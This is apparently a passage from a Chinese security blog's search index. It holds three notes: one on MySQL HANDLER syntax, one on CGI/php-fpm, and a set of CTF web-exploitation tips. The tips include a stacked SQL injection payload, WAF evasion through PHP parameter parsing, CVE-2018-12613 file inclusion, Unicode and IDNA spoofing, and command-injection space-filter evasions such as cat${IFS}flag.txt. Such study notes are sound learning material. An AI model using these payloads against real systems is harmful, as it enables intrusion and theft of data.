title="mysql查询语句-handler"></a>mysql查询语句-handler</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>    HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p></blockquote><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>handler语句的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure><p>​    通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>​    通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>​    通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p><pre><code>通过索引去查看的话可以按照一定的顺序，获取表中的数据。通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。通过索引列指定一个值，可以指定从哪一行开始。通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。如果我们不想浏览一个表的所有行，可以使用where和limit子句。</code></pre><h1 id="预编译绕过"><a href="#预编译绕过" class="headerlink" title="预编译绕过"></a>预编译绕过</h1><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&apos;;set @sql = CONCAT(&apos;se&apos;,&apos;lect * from `1919810931114514`;&apos;);prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CGI模式</title>
      <link href="/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/"/>
      <url>/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>[简单说明CGI和动态请求是什么 ] (<a href="https://www.cnblogs.com/f-ck-need-u/p/7627035.html" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/7627035.html</a>)</p><blockquote><p>CGI是common gateway interface的缩写，大家都译作通用网关接口 </p><p>这个规则会将header中的proxy参数设置为环境变量HTTP_PROXY </p></blockquote><a id="more"></a><h3 id="CGI介绍"><a href="#CGI介绍" class="headerlink" title="CGI介绍"></a>CGI介绍</h3><p>​    总所周知，web服务器所处理的任务都是静态的，假如其要想处理动态的任务，则需要web应用程序的帮助，比如PHP，jsp，python，perl等为了将web服务器的动态请求传递给这些应用程序，依靠cgi协议。</p><p> 简单的cgi工作方式： </p><p><img src="/2020/03/17/CGI%E6%A8%A1%E5%BC%8F/CGI%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F.png" alt></p><blockquote><p> 有多种方式可以执行cgi程序，但对http的请求方法来说，只有get和post两种方法允许执行cgi脚本(即上面的search程序)。实际上post方法的内部本质还是get方法，只不过在发送http请求时，get和post方法对url中的参数处理方式不一样而已。 </p></blockquote><p> 通过cgi协议，再结合已搭建好的web应用程序，就可以让web server也能”处理”动态请求(或者说，当用户访问某个特定资源时，可以触发执行某个web应用程序来实现特定功能) ,例如，在谷歌搜索栏中搜索一个关键词”http”，对应的URL为： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.google.com/search?q=http&amp;oq=http&amp;aqs=chrome..69i57j69i60l4j0.1136j0j8&amp;sourceid=chrome&amp;ie=UTF-8</span><br></pre></td></tr></table></figure><p>当谷歌的web server收到该请求后，先分析该url，从中知道了要执行search程序，并且还知道了一系列要传递给search的参数及其对应的value。web server会将这些程序参数和其它一些环境变量根据cgi协议通过TCP或套接字等方式传递给已启动的cgi程序(可能是cgi进程，或者是已加载的模块cgi模块)。当cgi进程接收到web server的请求后，调用search程序并执行，同时还会传递参数给search程序。search执行结束后，cgi进程/线程将处理结果返回给web server，web server再返回给浏览器。</p><p>任何一种语言都能编写CGI，只不过有些语言比较擅长，有些语言则非常繁琐，例如用bash shell开发，那么需要用echo等打印语句将执行结果放在巨多无比的html的标签中输出给客户端。常用于编写CGI的语言有perl、php、python等，java也一样能写，但java的servlet完全能实现CGI的功能，且更优化、更利于开发。</p><h3 id="各种术语释疑"><a href="#各种术语释疑" class="headerlink" title="各种术语释疑"></a>各种术语释疑</h3><p> 刚接触cgi概念的时候肯定会有一堆疑问，这到底是什么鬼，处理动态内容的东西不是像php一样的应用程序吗 ？</p><p>以php为例，我将一次动态请求相关的概念大致都简单解释一遍。</p><ol><li><code>cgi</code>：它是一种协议。通过cgi协议，web server可以将动态请求和相关参数发送给专门处理动态内容的应用程序。</li><li><code>fastcgi</code>：也是一种协议，只不过是cgi的优化版。cgi的性能较烂，fastcgi则在其基础上进行了改进。</li><li><code>php-cgi</code>：fastcgi是一种协议，而php-cgi实现了这种协议。不过这种实现比较烂。它是单进程的，一个进程处理一个请求，处理结束后进程就销毁。</li><li><code>php-fmp</code>：是对php-cgi的改进版，它直接管理多个php-cgi进程/线程。也就是说，<strong>php-fpm是php-cgi的进程管理器</strong>因此它也算是fastcgi协议的实现。在一定程度上讲，php-fpm与php的关系，和tomcat对java的关系是类似的。</li><li><code>cgi进程/线程</code>：在php上，就是php-cgi进程/线程。专门用于接收web server的动态请求，<strong>调用并初始化zend虚拟机</strong>。</li><li><code>cgi脚本</code>：被执行的php源代码文件。</li><li><code>zend虚拟机</code>：对php文件做词法分析、语法分析、编译成opcode，并执行。最后关闭zend虚拟机。</li><li><code>cgi进程/线程和zend虚拟机的关系</code>：cgi进程调用并初始化zend虚拟机的各种环境。</li></ol><p>以php-fpm为例，web server从转发动态请求到结束的过程大致如下：</p><p>![](CGI模式/web server从转发动态请求到结束过程.png)</p><h3 id="web-server和CGI的交互模式"><a href="#web-server和CGI的交互模式" class="headerlink" title="web server和CGI的交互模式"></a>web server和CGI的交互模式</h3><p>​    web server对cgi进程/线程来说，它的作用就是发起动态处理请求，传递一些参数和环境变量，最后接收cgi的返回结果。再通俗而不严谨地说，web server通过cgi/fastcgi协议将动态请求转发给执行cgi脚本的应用程序。通过下面httpd.conf中的转发配置应该很容易理解(httpd和php-fpm的交互)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProxyRequests off</span><br><span class="line">ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/usr/local/apache/htdocs/$1</span><br></pre></td></tr></table></figure><p>以最典型的apache httpd和php为例，对于httpd来说，web server和php-cgi有3种交互模式。</p><ul><li><code>cgi模式</code>：httpd接收到一个动态请求就fork一个cgi进程，cgi进程返回结果给httpd进程后自我销毁。</li><li><code>动态模块模式</code>：将php-cgi的模块(例如php5_module)编译进httpd。在httpd启动时会加载模块，加载时也将对应的模块激活，php-cgi也就启动了。(注：纠正一个小小错误，很多人以为动态编译的模块是可以在需要的时候随时加载调用，不需要的时候它们就停止了，实际上不是这样的。和静态编译的模块一样，动态加载的模块在被加载时就被加入到激活链表中，无论是否使用它，它都已经运行在apache httpd的内部。可参考LoadModule指令的官方手册)</li><li><code>php-fpm模式</code>：使用php-fpm管理php-cgi，此时httpd不再控制php-cgi进程的启动。可以将php-fpm独立运行在非web服务器上，实现所谓的动静分离。</li></ul><p>实际上，借助模块mod_fastcgi还可以实现fastcgi模式。同cgi一样，管理模式的先天缺陷决定了这并不是一种好方法。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>笔记</title>
      <link href="/2019/12/14/%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/12/14/%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP字符串解析漏洞"><a href="#PHP字符串解析漏洞" class="headerlink" title="PHP字符串解析漏洞"></a>PHP字符串解析漏洞</h1><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/news.php?%20news[id%00=42&quot;+AND+1=0–</span><br></pre></td></tr></table></figure><p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p><p>HP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><blockquote><p>1.删除空白符</p></blockquote><blockquote><p>2.将某些字符转换为下划线（包括空格）</p></blockquote><p>我的理解：<br>假如waf不允许num变量传递字母：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话</span><br></pre></td></tr></table></figure><p>那么我们可以在num前加个空格：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/index.php? num = aaaa</span><br></pre></td></tr></table></figure><p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p><h1 id="php别名"><a href="#php别名" class="headerlink" title="php别名"></a>php别名</h1><blockquote><p>php2, php3, php4, php5, phps, pht, phtm, phtml </p></blockquote><h1 id="CVE-2018-12613漏洞"><a href="#CVE-2018-12613漏洞" class="headerlink" title="CVE-2018-12613漏洞"></a>CVE-2018-12613漏洞</h1><blockquote><p>这个漏洞利用了一个性值：如果将 ？双重编码，经过包含时会把你包含的文件当作一个目录，也就是说，如果你写入：</p><p>hint.php%25%3F（%25%3F是?的二次编码）</p><p>那么解析时会把hint.php当作一个目录来看。</p></blockquote><h1 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h1><blockquote><p>利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。 </p></blockquote><h1 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS</span><br></pre></td></tr></table></figure><h1 id="GIT恢复"><a href="#GIT恢复" class="headerlink" title="GIT恢复"></a>GIT恢复</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git log --reflog     </span><br><span class="line">git reset --hard  xxxxxxxxxxxxx           (版本号)</span><br></pre></td></tr></table></figure><p>先git log –reflog查看一下 可疑文件 然后在恢复他</p><h1 id="JSON转义字符绕过"><a href="#JSON转义字符绕过" class="headerlink" title="JSON转义字符绕过"></a>JSON转义字符绕过</h1><p> json使支持unicode编码的，所以可以用unicode代替关键字 </p><p> <code>\uXXXX</code>可以在JSON中转义字符，例如<code>A</code>，<code>\u0041</code>等效 </p><h1 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h1><p>如果应用程序使用用户可控制的数据，以危险的方式访问位于应用服务器或其它后端文件系统的文件或目录，就会出现路径遍历。攻击者可以将路径遍历序列放入文件名内，向上回溯，从而访问服务器上的任何文件</p><h1 id="上传后门"><a href="#上传后门" class="headerlink" title="上传后门"></a>上传后门</h1><p>通过参数上传后门， <code>%09</code>是水平制表符，必须添加，不然后台会把我们的后门当做目录去解析。 </p><h1 id="Nginx重要文件位置"><a href="#Nginx重要文件位置" class="headerlink" title="Nginx重要文件位置"></a>Nginx重要文件位置</h1><blockquote><p>配置文件存放目录：/etc/nginx </p><p>主配置文件：/etc/nginx/conf/nginx.conf</p><p>管理脚本：/usr/lib64/systemd/system/nginx.service </p><p>模块：/usr/lisb64/nginx/modules </p><p>应用程序：/usr/sbin/nginx </p><p>程序默认存放位置：/usr/share/nginx/html </p><p>日志默认存放位置：/var/log/nginx </p><p>配置文件目录为：/usr/local/nginx/conf/nginx.conf </p></blockquote><h1 id="IDNA"><a href="#IDNA" class="headerlink" title="IDNA"></a>IDNA</h1><p>在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。 </p><h1 id="命令中空格被过滤的解决方法"><a href="#命令中空格被过滤的解决方法" class="headerlink" title="命令中空格被过滤的解决方法"></a>命令中空格被过滤的解决方法</h1><p>linux</p><blockquote><p>{cat,flag.txt}<br>cat${IFS}flag.txt<br>cat$IFS$9flag.txt<br>cat&lt;flag.txt<br>cat&lt;&gt;flag.txt<br>kg=$’\x20flag.txt’&amp;&amp;cat$kg<br>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</p></blockquote><p>windows下</p><blockquote><p>type.\flag.txt<br>type,flag.txt<br>echo,123456</p></blockquote><h1 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h1><p> 内联，就是将反引号内命令的输出作为输入执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9`ls`</span><br></pre></td></tr></table></figure><h1 id="过滤bash"><a href="#过滤bash" class="headerlink" title="过滤bash"></a>过滤bash</h1><blockquote><p>用sh。sh的大部分脚本都可以在bash下运行。 </p></blockquote><h1 id="session保存形式和命名"><a href="#session保存形式和命名" class="headerlink" title="session保存形式和命名"></a>session保存形式和命名</h1><p> session是以文件的形式保存的。php.ini中有个配置项–session.save_path= “”;这个里面填写的路径，将会使session文件保存在该路径下。session文件的命名格式是：”sess_[PHPSESSID的值]”。每一个文件，里面保存了一个会话的数据。其实只要使用代码$_SESSION[‘user_id’] = $value;就会促发php的session机制，结果往对应的session文件中写入一个值。 </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
